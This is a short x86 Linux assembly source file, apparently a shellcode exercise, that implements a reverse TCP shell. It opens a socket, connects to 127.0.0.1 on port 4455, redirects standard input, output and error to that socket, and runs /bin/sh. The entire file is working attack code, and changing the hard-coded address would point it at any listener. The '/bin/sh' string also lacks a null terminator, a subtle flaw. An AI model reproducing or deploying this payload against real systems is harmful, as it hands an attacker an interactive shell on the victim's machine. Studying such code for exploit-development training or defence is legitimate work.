; Shell Reverse TCP
; Written by Hussien Yousef

global _start

section .text
_start:

; socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
mov eax, 102
mov ebx, 1
; args to socket
push 0
push 1
push 2
mov ecx, esp
int 0x80

; connect(sockfd, *sockaddr_in, srv_add_len)
mov edx, 102
xchg eax, edx
mov ebx, 3
; sockaddr_in struct
push 0x0100007F ; 127.0.0.1
push word 0x6711 ; port 4455
xor edi, edi
mov di, 2
push di
mov ecx, esp
; args to connect
push 16
push ecx
push edx
mov ecx, esp
int 0x80


; dup2(sockfd, 2) dup2(sockfd, 1) dup2(sockfd, 0)
mov ebx, edx
mov ecx, 2
rotate:
mov eax, 63
int 0x80
dec ecx
jns rotate


; execve("/bin/sh", null, null)
lea ebx, [my_shell]
mov eax, 11
xor ecx, ecx
xor edx, edx
int 0x80


section .data
my_shell: db "/bin/sh"
